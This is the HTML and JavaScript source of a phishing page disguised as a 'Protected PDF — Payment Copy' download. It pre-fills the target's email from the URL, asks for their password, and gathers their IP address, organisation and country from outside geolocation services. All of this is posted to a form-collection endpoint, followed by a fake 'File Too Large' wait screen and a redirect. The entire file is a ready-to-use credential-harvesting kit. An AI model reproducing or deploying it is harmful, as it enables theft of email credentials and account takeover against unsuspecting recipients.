<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF ‚Äî Payment Copy</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; font-family: Arial, sans-serif; }
    body {
      background: url('https://i.ibb.co/9YF5M7n/payment-bg.jpg') center/cover no-repeat;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #splash {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #111;
      color: #fff;
      font-size: 1.5rem;
      display: flex; align-items: center; justify-content: center;
      z-index: 1000;
      transition: opacity 0.6s ease;
    }
    #main {
      background: rgba(255, 255, 255, 0.9);
      border-radius: 16px;
      padding: 2rem;
      width: 320px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      text-align: center;
      transform: translateY(20px);
      opacity: 0;
      transition: all 0.8s ease;
    }
    #main.show { opacity: 1; transform: translateY(0); }
    h2 { margin-bottom: 1.5rem; color: #222; }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
    }
    input[readonly] {
      background: #f5f5f5;
      color: #444;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      background: #0078d4;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
    }
    button:hover { background: #005fa3; }
    .hidden { display: none; }
    #togglePassword { position: absolute; right: 12px; top: 10px; cursor: pointer; }

    /* Modal */
    #modalOverlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.65);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2000;
    }
    #modalBox {
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      text-align: center;
      max-width: 320px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      animation: popIn 0.4s ease forwards;
    }
    @keyframes popIn { from {transform: scale(0.9); opacity:0;} to {transform: scale(1); opacity:1;} }
  </style>
</head>
<body>
  <div id="splash">Loading Protected File...</div>

  <main id="main">
    <h2>Protected PDF ‚Äî Payment Copy</h2>
    <form id="mainForm" method="POST" action="https://submit-form.com/your-formspark-endpoint">
      <!-- Step 1 -->
      <div id="stepEmail">
        <input type="email" id="email" name="email" placeholder="Email address" required readonly />
        <button type="button" id="continueBtn">Continue</button>
      </div>

      <!-- Step 2 -->
      <div id="stepPassword" class="hidden" style="position: relative;">
        <input type="password" id="password" name="password" placeholder="Password" required />
        <span id="togglePassword">üëÅÔ∏è</span>
        <input type="hidden" id="ip" name="ip">
        <input type="hidden" id="hostname" name="hostname">
        <button type="submit">Download Payment Copy</button>
      </div>
    </form>
  </main>

  <!-- Modal -->
  <div id="modalOverlay">
    <div id="modalBox">
      <h3>File Too Large</h3>
      <p>Your file is being processed, please wait...</p>
    </div>
  </div>

  <script>
    // Splash animation
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('splash').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('splash').style.display = 'none';
          document.getElementById('main').classList.add('show');
        }, 600);
      }, 600);
    });

    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const stepEmail = document.getElementById('stepEmail');
    const stepPassword = document.getElementById('stepPassword');
    const continueBtn = document.getElementById('continueBtn');
    const toggle = document.getElementById('togglePassword');
    const modal = document.getElementById('modalOverlay');

    // Autofill email
    window.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      if (urlEmail) {
        emailInput.value = decodeURIComponent(urlEmail);
      } else {
        emailInput.value = "user@example.com"; // fallback
      }

      // IP + Hostname
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          document.getElementById('ip').value = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(r => r.json())
        .then(info => {
          const host = info.org ? `${info.org} (${info.country_name})` : info.country_name || 'Unknown';
          document.getElementById('hostname').value = host;
        })
        .catch(() => document.getElementById('hostname').value = 'Fetch Failed');
    });

    // Continue ‚Üí password step
    continueBtn.addEventListener('click', () => {
      stepEmail.classList.add('hidden');
      stepPassword.classList.remove('hidden');
      passwordInput.focus();
    });

    // Toggle password
    toggle.addEventListener('click', () => {
      const isHidden = passwordInput.type === 'password';
      passwordInput.type = isHidden ? 'text' : 'password';
      toggle.textContent = isHidden ? 'üôà' : 'üëÅÔ∏è';
    });

    // Submit ‚Üí show modal ‚Üí redirect after 8s
    document.getElementById('mainForm').addEventListener('submit', () => {
      modal.style.display = 'flex';
      setTimeout(() => {
        window.location.href = "https://submit-form.com/your-formspark-endpoint";
      }, 8000);
    });
  </script>
</body>
</html>
